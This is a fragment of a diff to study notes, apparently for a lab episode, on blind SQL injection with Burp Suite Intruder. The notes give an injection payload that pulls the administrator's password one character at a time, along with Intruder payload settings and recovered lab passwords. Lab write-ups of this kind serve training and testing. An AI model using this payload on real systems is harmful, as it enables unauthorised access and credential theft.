@@ -133,10 +133,10 @@ Episode11- YouTube Channel AcronProject:
         |   
         17- with True answer response ---> Go to Intruder ----> Positions ----> Attack Type = Cluster bomb
         18- use this query-:
-        |                                                                                                                    $1$                                               $a$
+        |                                                                                                                    $1$                                             $a$
         |                                                              'asDAWF2$DSGX!123!EXV' and (select substring(password,1,1) from users where username='administrator')='a'--        
         |    select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select substring(password,$1$,1) from users where username='administrator')='$a$'--'
-        |
+        |                                                                                                                               c2gy
         19- Go to Payloads tab-:
         |     19-1 Payload set 1 & 2
         |     19-2 on Payloads Options ---> From = 1 && To = length of reach && step = 1
@@ -146,7 +146,7 @@ Episode11- YouTube Channel AcronProject:
         |                               4- adQ7xxxxxxx
         |
                 Password = 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
-                           63hbelr10ywa9h1aofp7                        
+                           923o2tuni3tox782vvdt                                           
 
 
 
